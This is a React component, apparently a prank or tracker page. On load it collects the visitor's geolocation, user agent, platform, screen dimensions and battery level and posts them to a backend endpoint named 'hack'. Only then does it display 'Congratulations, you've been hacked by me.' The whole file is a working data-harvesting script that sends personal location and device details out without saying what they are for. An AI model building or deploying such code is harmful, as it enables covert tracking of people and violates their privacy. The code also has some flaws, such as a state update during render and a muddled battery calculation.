/* eslint-disable react/no-unescaped-entities */
import { useEffect, useState } from 'react';
import './App.css';
import request from './server';

function App() {
  const [batteryLevel, setBatteryLevel] = useState(null);
  const [mylocation, setLocation] = useState();

  const userAgent = navigator.userAgent; // Информация о браузере и операционной системе
  const platform = navigator.platform; // Информация об операционной системе



  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const latitude = position.coords.latitude; // Широта
        const longitude = position.coords.longitude; // Долгота
        setLocation(`https://www.openstreetmap.org/#map=18/${latitude}/${longitude}`)
      },
      (error) => {
        console.error("Error getting geolocation:", error);
      }
    );
  } else {
    setLocation('Geolocation is not supported')
  }

  const screenWidth = window.screen.width;
  const screenHeight = window.screen.height;
  const screenPixelRatio = window.devicePixelRatio;

  const diagonal = Math.sqrt(screenWidth ** 2 + screenHeight ** 2);

  // Расчет дюймовой диагонали
  const inches = diagonal / screenPixelRatio;

  console.log(`Дюймовая диагональ экрана: ${inches} дюймов`);

  console.log(window);

  useEffect(() => {
    function handleBatteryChange() {
      navigator.getBattery().then((battery) => {
        const level = Math.floor((battery.level || battery.chargingTime / battery.dischargingTime) * 100);
        setBatteryLevel(level);
      });
    }

    navigator.getBattery().then((battery) => {
      handleBatteryChange();
      battery.addEventListener('levelchange', handleBatteryChange);
    });

    return () => {
      navigator.getBattery().then((battery) => {
        battery.removeEventListener('levelchange', handleBatteryChange);
      });
    };
  }, []);

  useEffect(() => {
    if (batteryLevel !== null) {
      handleClick();
    }
  }, [batteryLevel, mylocation, userAgent, platform, inches]);

  async function handleClick() {
    await request.post("hack", { precentBattery: batteryLevel, location: mylocation, informationSystems: userAgent, operatingSystems: platform, dyum: inches });
    console.log('dads');
  }

  return (
    <>
      <h1 className='text'>
        Congratulations, you've been hacked by me
      </h1>
    </>
  );
}

export default App;